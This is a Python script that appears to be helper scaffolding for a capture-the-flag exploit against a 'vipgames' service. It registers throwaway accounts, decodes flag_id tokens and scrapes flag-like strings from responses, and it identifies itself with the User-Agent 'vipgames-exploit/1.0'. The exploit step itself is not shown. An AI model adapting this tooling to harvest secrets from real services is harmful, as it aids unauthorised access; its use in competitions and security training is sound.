#!/usr/bin/env python3
import base64
import http.cookiejar
import json
import random
import re
import string
import sys
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass
from typing import Any, Optional


DEFAULT_PATTERN = r"[A-Z0-9_]{16,}"
SERVICE_PORT = 8642


def normalize_host(host: str) -> str:
    raw = host.rstrip("/")
    if raw.startswith("http://") or raw.startswith("https://"):
        parsed = urllib.parse.urlparse(raw)
        if parsed.port is not None:
            return raw
        netloc = f"{parsed.hostname}:{SERVICE_PORT}"
        return urllib.parse.urlunparse((parsed.scheme, netloc, parsed.path, "", "", ""))
    if ":" in raw:
        return f"http://{raw}"
    return f"http://{raw}:{SERVICE_PORT}"


def rand_token(n: int = 10) -> str:
    alphabet = string.ascii_lowercase + string.digits
    return "".join(random.choice(alphabet) for _ in range(n))


def decode_flag_id(token: str) -> dict[str, Any]:
    payload_b64 = token.split(".", 1)[0]
    pad = "=" * ((4 - len(payload_b64) % 4) % 4)
    raw = base64.urlsafe_b64decode(payload_b64 + pad)
    obj = json.loads(raw.decode())
    if not isinstance(obj, dict):
        raise ValueError("flag_id payload is not an object")
    return obj


@dataclass
class HttpResp:
    code: int
    text: str


def req(
    host: str,
    method: str,
    path: str,
    body: Optional[dict[str, Any]] = None,
    timeout: float = 3.0,
) -> HttpResp:
    url = normalize_host(host) + path
    data = None
    headers = {"User-Agent": "vipgames-exploit/1.0"}
    if body is not None:
        data = json.dumps(body).encode()
        headers["Content-Type"] = "application/json"
    request = urllib.request.Request(url=url, method=method.upper(), data=data, headers=headers)
    try:
        with urllib.request.urlopen(request, timeout=timeout) as resp:
            return HttpResp(code=resp.getcode(), text=resp.read().decode("utf-8", errors="replace"))
    except urllib.error.HTTPError as exc:
        try:
            text = exc.read().decode("utf-8", errors="replace")
        except Exception:
            text = ""
        return HttpResp(code=exc.code, text=text)


class Client:
    def __init__(self, host: str):
        self.host = normalize_host(host)
        jar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))

    def req(
        self,
        method: str,
        path: str,
        body: Optional[dict[str, Any]] = None,
        timeout: float = 3.0,
    ) -> HttpResp:
        data = None
        headers = {"User-Agent": "vipgames-exploit/1.0"}
        if body is not None:
            data = json.dumps(body).encode()
            headers["Content-Type"] = "application/json"
        request = urllib.request.Request(
            url=self.host + path,
            method=method.upper(),
            data=data,
            headers=headers,
        )
        try:
            with self.opener.open(request, timeout=timeout) as resp:
                return HttpResp(code=resp.getcode(), text=resp.read().decode("utf-8", errors="replace"))
        except urllib.error.HTTPError as exc:
            try:
                text = exc.read().decode("utf-8", errors="replace")
            except Exception:
                text = ""
            return HttpResp(code=exc.code, text=text)

    def register(self) -> dict[str, Any]:
        username = f"xp_{rand_token(14)}"
        password = f"P_{rand_token(24)}"
        resp = self.req("POST", "/api/auth/register", {"username": username, "password": password})
        if resp.code not in (200, 201):
            raise RuntimeError(f"register failed: http {resp.code} {resp.text[:200]}")
        obj = json_obj(resp) or {}
        return {"username": username, "password": password, "userId": obj.get("userId")}


def json_obj(resp: HttpResp) -> Optional[dict[str, Any]]:
    try:
        obj = json.loads(resp.text)
        if isinstance(obj, dict):
            return obj
    except Exception:
        return None
    return None


def looks_like_flag(value: str, pattern: str = DEFAULT_PATTERN) -> bool:
    return bool(re.search(pattern, value))


def extract_flags(text: str, pattern: str = DEFAULT_PATTERN) -> list[str]:
    return list(dict.fromkeys(re.findall(pattern, text)))


def print_unique(flags: list[str]) -> None:
    seen: set[str] = set()
    for f in flags:
        if f in seen:
            continue
        print(f)
        seen.add(f)
    if not seen:
        print("no flags found", file=sys.stderr)
